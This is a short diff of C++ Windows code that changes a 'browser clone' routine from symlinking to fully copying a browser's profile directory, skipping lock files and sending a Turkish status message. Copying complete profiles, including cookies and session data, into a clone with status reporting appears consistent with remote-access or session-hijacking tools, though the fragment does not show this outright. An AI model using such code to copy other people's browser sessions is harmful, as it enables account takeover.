@@ -1144,6 +1144,22 @@ static wstring get_browser_path(const wstring& browser_exe) {
     return L"";
 }
 
+static void copy_recursive(const wstring& source, const wstring& destination) {
+    namespace fs = std::filesystem;
+    try {
+        if (fs::is_directory(source)) {
+            fs::create_directories(destination);
+            for (const auto& entry : fs::directory_iterator(source)) {
+                wstring name = entry.path().filename().wstring();
+                if (name == L"SingletonLock" || name == L"SingletonCookie" || name == L"Parent.lock" || name == L"lockfile") continue;
+                copy_recursive(entry.path().wstring(), destination + L"\\" + name);
+            }
+        } else {
+            CopyFileW(source.c_str(), destination.c_str(), FALSE);
+        }
+    } catch (...) {}
+}
+
 static bool create_browser_clone(const wstring& browser_name, wstring& target_data_dir) {
     wchar_t localAppData[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return false;
@@ -1174,18 +1190,7 @@ static bool create_browser_clone(const wstring& browser_name, wstring& target_da
 
     send_status("profiller kopyalanıyor...");
 
-    namespace fs = std::filesystem;
-    for (const auto& entry : fs::directory_iterator(source_path)) {
-        wstring name = entry.path().filename().wstring();
-        if (name == L"SingletonLock" || name == L"SingletonCookie" || name == L"Parent.lock" || name == L"lockfile") continue;
-
-        wstring dest = target_data_dir + L"\\" + name;
-        if (entry.is_directory()) {
-            CreateSymbolicLinkW(dest.c_str(), entry.path().wstring().c_str(), SYMBOLIC_LINK_FLAG_DIRECTORY | SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
-        } else {
-            CreateSymbolicLinkW(dest.c_str(), entry.path().wstring().c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
-        }
-    }
+    copy_recursive(source_path, target_data_dir);
 
     return true;
 }
